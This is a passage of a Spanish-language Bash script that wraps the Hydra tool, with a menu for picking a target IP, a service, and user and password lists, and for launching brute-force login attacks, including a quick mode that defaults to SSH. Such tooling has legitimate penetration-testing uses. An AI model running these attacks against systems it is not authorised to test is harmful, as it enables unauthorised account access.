        echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${NC}                         ${YELLOW}MENÚ PRINCIPAL${NC}                               ${BLUE}║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}1.${NC}  🎯 Configurar Objetivo                                          ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}2.${NC}  🔧 Seleccionar Servicio                                        ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}3.${NC}  👥 Configurar Lista de Usuarios                                ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}4.${NC}  🔑 Configurar Lista de Contraseñas                             ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}5.${NC}  ⚙️ Configurar Parámetros de Ataque                             ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}6.${NC}  💀 Iniciar Ataque Hydra                                        ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}7.${NC}  🚀 Ataque Rápido (Auto)                                        ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}8.${NC}  📊 Ver Resultados                                               ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}0.${NC}  🚪 Salir                                                        ${BLUE}║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        
        if [[ -n "$TARGET_IP" ]]; then
            echo -e "\n${GREEN}🎯 Objetivo: $TARGET_IP${NC}"
        fi
        
        if [[ -n "$TARGET_SERVICE" ]]; then
            echo -e "${GREEN}🔧 Servicio: $TARGET_SERVICE${NC}"
        fi
        
        if [[ -n "$USERNAME_LIST" ]]; then
            echo -e "${GREEN}👥 Usuarios: $(wc -l < "$USERNAME_LIST" 2>/dev/null || echo "?")${NC}"
        fi
        
        if [[ -n "$PASSWORD_LIST" ]]; then
            echo -e "${GREEN}🔑 Contraseñas: $(wc -l < "$PASSWORD_LIST" 2>/dev/null || echo "?")${NC}"
        fi
        
        echo ""
        read -p "Selecciona una opción (0-8): " choice
        
        case $choice in
            1) 
                select_target
                read -p "Presiona Enter para continuar..."
                ;;
            2) 
                [[ -z "$TARGET_IP" ]] && select_target
                select_service
                read -p "Presiona Enter para continuar..."
                ;;
            3) 
                configure_username_strategy
                read -p "Presiona Enter para continuar..."
                ;;
            4) 
                configure_password_strategy
                read -p "Presiona Enter para continuar..."
                ;;
            5) 
                configure_attack_parameters
                read -p "Presiona Enter para continuar..."
                ;;
            6)
                if [[ -n "$TARGET_IP" && -n "$TARGET_SERVICE" && -n "$USERNAME_LIST" && -n "$PASSWORD_LIST" ]]; then
                    setup_output_directory
                    execute_hydra_attack
                    show_hydra_summary
                else
                    echo -e "${RED}❌ Configura todos los parámetros primero${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                echo -e "${YELLOW}🚀 Configurando ataque rápido...${NC}"
                [[ -z "$TARGET_IP" ]] && select_target
                [[ -z "$TARGET_SERVICE" ]] && { TARGET_SERVICE="ssh"; echo -e "${YELLOW}Usando SSH por defecto${NC}"; }
                
                setup_output_directory
                select_predefined_usernames
                generate_service_default_passwords
                THREADS=16
                
                execute_hydra_attack
                show_hydra_summary
                read -p "Presiona Enter para continuar..."
                ;;
            8)
                if [[ -n "$OUTPUT_DIR" ]]; then
                    show_hydra_summary
                else
                    echo -e "${YELLOW}⚠️ No hay resultados para mostrar${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            0)
                echo -e "${GREEN}👋 ¡Hasta luego!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                sleep 1
                ;;
        esac
    done
}

# Verificar herramientas necesarias
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}❌ Hydra no está instalado${NC}"
    echo -e "${YELLOW}💡 Instala con: sudo apt install hydra${NC}"
    exit 1
fi

echo -e "${GREEN}✅ Hydra encontrado: $(hydra -h 2>&1 | head -1)${NC}"

# Ejecutar menú principal
main_menu